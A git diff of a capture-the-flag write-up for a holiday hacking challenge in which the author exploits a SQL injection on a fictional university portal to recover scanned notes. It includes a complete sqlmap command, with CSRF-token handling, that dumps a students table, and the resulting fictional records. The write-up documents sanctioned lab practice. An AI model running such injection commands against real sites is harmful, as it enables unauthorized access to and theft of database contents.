@@ -1,4 +1,17 @@
 # 9) Retrieve Scraps of Paper from Server
+
+## Prompt
+
+## Secondary Prompt from Krampus (learned this after solving haha)
+You did it! Thank you so much. I can trust you!
+To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels.
+As for those scraps of paper, I scanned those and put the images on my server.
+I then threw the paper away.
+Unfortunately, I managed to lock out my account on the server.
+Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans?
+I give you permission to hack into it, solving Objective 9 in your badge.
+And, as long as you're traveling around, be sure to solve any other challenges you happen across.
+## Solve Process
 This one sends us to a website... which probably has an injection vuln.
 Let's see!
 1. Check application status sounds odd, let's focus on that field.
@@ -97,48 +110,56 @@ Let's see!
     6,/krampus/ba417715.png
     ```
 1. Piecing together the images, we find the message contains:
-```
-From the Desk of <unreadable>
+    ```
+    From the Desk of <unreadable>
 
-Date: August 23, 20<unreadable>
+    Date: August 23, 20<unreadable>
 
-Memo to Self:
+    Memo to Self:
 
-Finally! I've figured out how to destroy Christmas!
-Santa has a brand new, cutting edge sleigh guidance
-technology, called the Super Sled-o-matic.
+    Finally! I've figured out how to destroy Christmas!
+    Santa has a brand new, cutting edge sleigh guidance
+    technology, called the Super Sled-o-matic.
 
-I've figured out a way to poison the data going into the
-system so that it will divert Santa's sled on Christmas
-Eve!
+    I've figured out a way to poison the data going into the
+    system so that it will divert Santa's sled on Christmas
+    Eve!
 
-Santa will be unable to make the trip and the holiday
-season will be destroyed! Santa's own technology will
-undermine him!
+    Santa will be unable to make the trip and the holiday
+    season will be destroyed! Santa's own technology will
+    undermine him!
 
-That's what they deserve for not listening to my
-suggestions for supporting other holiday characters!
+    That's what they deserve for not listening to my
+    suggestions for supporting other holiday characters!
 
-Bwahahahahaha!
-```
+    Bwahahahahaha!
+    ```
 1. This gives us the answer, "Super Sled-o-matic"
-
-Bonus:
-Let's dump the student database (the application database will probably be huge, but the student database might have something useful):
-```powershell
-python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --dump -D elfu -T students
-```
-Result:
-```csv
-id,bio,name,degree,student_number
-1,My goal is to be a happy elf!,Elfie,Raindeer Husbandry,392363902026
-2,"I'm just a elf. Yes, I'm only a elf. And I'm sitting here on Santa's sleigh, it's a long, long journey To the christmas tree. It's a long, long wait while I'm tinkering in the factory. But I know I'll be making kids smile on the holiday... At least I hope and pray that I will But today. I'm still ju",Elferson,Dreamineering,39210852026
-3,Have you seen my list??? It is pretty high tech!,Alabaster Snowball,Geospatial Intelligence,392363902026
-4,I am an engineer and the inventor of Santa's magic toy-making machine.,Bushy Evergreen,Composites and Engineering,392363902026
-5,My goal is to be a happy elf!,Wunorse Openslae,Toy Design,39236372526
-6,My goal is to be a happy elf!,Bushy Evergreen,Present Wrapping,392363128026
-7,Check out my makeshift armour made of kitchen pots and pans!!!,Pepper Minstix,Reindeer Husbandry,392363902026
-8,My goal is to be a happy elf!,Sugarplum Mary,Present Wrapping,5682168522137
-9,Santa and I are besties for life!!!,Shinny Upatree,Holiday Cheer,228755779218
-```
-Not useful after all, but maybe the student number will be useful later. :(
+  Bonus:
+  Let's dump the student database (the application database will probably be huge, but the student database might have something useful):
+    ```powershell
+    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --dump -D elfu -T students
+    ```
+    Result:
+    ```csv
+    id,bio,name,degree,student_number
+    1,My goal is to be a happy elf!,Elfie,Raindeer Husbandry,392363902026
+    2,"I'm just a elf. Yes, I'm only a elf. And I'm sitting here on Santa's sleigh, it's a long, long journey To the christmas tree. It's a long, long wait while I'm tinkering in the factory. But I know I'll be making kids smile on the holiday... At least I hope and pray that I will But today. I'm still ju",Elferson,Dreamineering,39210852026
+    3,Have you seen my list??? It is pretty high tech!,Alabaster Snowball,Geospatial Intelligence,392363902026
+    4,I am an engineer and the inventor of Santa's magic toy-making machine.,Bushy Evergreen,Composites and Engineering,392363902026
+    5,My goal is to be a happy elf!,Wunorse Openslae,Toy Design,39236372526
+    6,My goal is to be a happy elf!,Bushy Evergreen,Present Wrapping,392363128026
+    7,Check out my makeshift armour made of kitchen pots and pans!!!,Pepper Minstix,Reindeer Husbandry,392363902026
+    8,My goal is to be a happy elf!,Sugarplum Mary,Present Wrapping,5682168522137
+    9,Santa and I are besties for life!!!,Shinny Upatree,Holiday Cheer,228755779218
+    ```
+    Not useful after all, but maybe the student number will be useful later. :(
+1. Now that we've solved 8, Krampus now gives us another prompt:
+    ```
+    Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.
+    We’ve gotta stop whomever is behind it!
+    I managed to find this protected document on one of the compromised machines in our environment.
+    I think our attacker was in the process of exfiltrating it.
+    I’m convinced that it is somehow associated with the plan to destroy the holidays. Can you decrypt it?
+    There are some smart people in the NetWars challenge room who may be able to help us.
+    ```
